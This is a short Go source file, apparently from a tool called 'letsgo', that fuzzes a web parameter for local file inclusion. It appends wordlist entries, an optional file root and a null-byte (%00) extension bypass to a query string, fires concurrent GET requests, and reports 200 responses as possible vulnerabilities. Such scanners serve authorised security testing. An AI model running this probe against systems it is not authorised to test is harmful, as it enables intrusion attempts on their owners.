package letsgo

import (
	"fmt"
	"net/http"
	"strings"
	"sync"

	"github.com/CX330Blake/letsgo/pkg/output"
)

// Send request and check response
func testEach(url string, param string, fileRoot string, extension string, wordlist string) {
	// If the file root is set, asure it ends with a slash
	if fileRoot != "" && !strings.HasSuffix(fileRoot, "/") {
		fileRoot += "/"
	}

	fullURL := fmt.Sprintf("%s?%s=%s%s", url, param, fileRoot, wordlist)
	if extension != "" && strings.HasPrefix(extension, ".") {
		fullURL = fmt.Sprintf("%s?%s=%s%s%%00%s", url, param, fileRoot, wordlist, extension)
	} else if extension != "" && !strings.HasPrefix(extension, ".") {
		fullURL = fmt.Sprintf("%s?%s=%s%s%%00.%s", url, param, fileRoot, wordlist, extension)
	}

	resp, err := http.Get(fullURL)
	if err != nil {
		// color.Red("[!] Request failed: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Simple check if the response might indicate a vulnerability
	if resp.StatusCode == http.StatusOK {
		output.Good("[+] Found Possible Vuln URL: %s (Status: %d)\n", fullURL, resp.StatusCode)
	}
}

// Multi-threaded testing
func Test(url string, param string, fileRoot string, extension string, wordlist []string) {
	_, err := http.Get(url)
	if err != nil {
		output.Err("[!] Host seems down...\n")
		return
	}

	var wg sync.WaitGroup

	for _, payload := range wordlist {
		wg.Add(1)
		go func(wl string) {
			defer wg.Done()
			testEach(url, param, fileRoot, extension, wl)
		}(payload)
	}

	wg.Wait()
}
